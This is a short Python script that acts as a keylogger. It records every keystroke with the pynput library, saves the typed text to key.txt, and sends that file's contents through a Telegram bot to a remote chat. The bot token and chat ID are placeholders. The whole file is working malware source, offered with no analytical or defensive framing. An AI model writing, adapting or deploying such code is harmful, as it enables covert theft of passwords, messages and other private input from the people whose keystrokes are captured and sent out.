import pynput
import time
from pynput.keyboard import Key, Listener
import os
import telegram
import threading


keys = []

def on_press(key):
    print(key, end="")
    # print("pressed")
    global keys, count
    keys.append(str(key))

def bot_message():
    try:
        #Use this token to access the HTTP API:
        notify = telegram.Bot("abc")
        #Read file 
        f1 = open("key.txt", 'r+', encoding='UTF-8')
        data1 = f1.readlines()
        message1 = "{}".format(data1)
        notify.send_message(chat_id="abcd", text=message1, parse_mode='Markdown')
    except Exception as ex:
        print(ex)


def message(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.enter":
            k = " "
        if key == "Key.space":
            k = " " 
        # elif key.find("Key")>0:
        #     k = ""
        message += k
    with open("key.txt", 'w+' , encoding='utf-8') as f:
        f.write(message)
    
def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release=on_release) as listener:
    listener.join()
    message(keys)
    bot_message()
